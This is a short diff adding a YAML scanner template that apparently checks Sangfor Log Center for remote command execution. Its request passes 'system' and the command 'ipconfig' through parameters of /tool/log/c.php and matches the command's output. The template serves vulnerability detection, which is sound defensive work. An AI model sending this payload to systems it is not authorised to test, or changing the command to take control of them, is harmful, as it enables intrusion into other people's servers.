@@ -1,0 +1,24 @@
+id: sangfor-cphp-rce
+brief:
+    title: Sangfor Log Center - Remote Command Execution
+    by: DhiyaneshDk
+    level: critical
+    about: Sangfor Log Center is vulnerable to RCE.
+    label:
+        - sangfor
+        - rce
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/tool/log/c.php?strip_slashes=system&host=ipconfig'
+      signs:
+        - "on": word
+          has:
+            - Windows IP
+            - Log Helper
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
